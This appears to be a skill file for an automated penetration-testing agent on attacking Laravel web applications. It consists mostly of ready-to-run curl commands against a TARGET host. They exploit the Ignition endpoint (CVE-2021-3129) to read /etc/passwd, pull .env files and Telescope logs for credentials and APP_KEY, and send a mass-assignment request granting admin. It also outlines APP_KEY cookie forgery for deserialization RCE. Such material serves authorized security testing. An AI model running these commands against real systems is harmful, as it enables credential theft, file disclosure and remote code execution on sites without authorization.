---
name: laravel
description: Laravel security testing covering debug mode, Ignition RCE, encryption oracle, queue injection, and configuration exposure
---

# Laravel Security Testing

## Key Vulnerabilities

### Debug Mode (APP_DEBUG=true)

```bash
# Laravel debug page reveals: APP_KEY, database credentials, full stack traces
curl -sk "https://TARGET/nonexistent-xalgorix" | grep -iE "laravel\|whoops\|debug\|APP_KEY"

# Ignition error page (Laravel 6-8)
curl -sk "https://TARGET/_ignition/health-check"
curl -sk "https://TARGET/_ignition/execute-solution" -X POST -H "Content-Type: application/json" \
  -d '{"solution":"Facade\\Ignition\\Solutions\\MakeViewVariableOptionalSolution","parameters":{"variableName":"test","viewFile":"php://filter/convert.base64-encode/resource=/etc/passwd"}}'
```

### Telescope Debug Tool

```bash
curl -sk "https://TARGET/telescope" | head -20
curl -sk "https://TARGET/telescope/requests" | head -50
# Telescope logs ALL requests with headers, bodies, and responses
```

### .env File Exposure

```bash
curl -sk "https://TARGET/.env" | head -20
# Contains: APP_KEY, DB_PASSWORD, MAIL_PASSWORD, AWS_SECRET
curl -sk "https://TARGET/.env.backup"
curl -sk "https://TARGET/.env.example"
```

### APP_KEY Exploitation

```bash
# If APP_KEY is leaked → forge encrypted cookies → RCE via deserialization
# Laravel uses APP_KEY for encryption of sessions, cookies, and CSRF tokens
# With known APP_KEY:
# 1. Decrypt session cookie
# 2. Inject serialized PHP object
# 3. Re-encrypt with known key
# 4. Send modified cookie → RCE via __wakeup/__destruct
```

### Mass Assignment

```bash
curl -sk "https://TARGET/api/register" -X POST -H "Content-Type: application/json" \
  -d '{"name":"test","email":"test@test.com","password":"test","is_admin":1,"role":"admin"}'
```

## Pro Tips

1. Laravel debug mode (Whoops) exposes APP_KEY — this is the master key for cookie forgery
2. `.env` file at web root is the most common Laravel vulnerability — always check
3. Ignition RCE (CVE-2021-3129) affects Laravel 6/7/8 — test `_ignition/execute-solution`
4. Telescope at `/telescope` logs all requests including auth tokens — major info disclosure
5. APP_KEY + known serialization gadgets (phpggc) = RCE via encrypted cookie manipulation
6. Check `/storage/logs/laravel.log` for log file exposure with stack traces
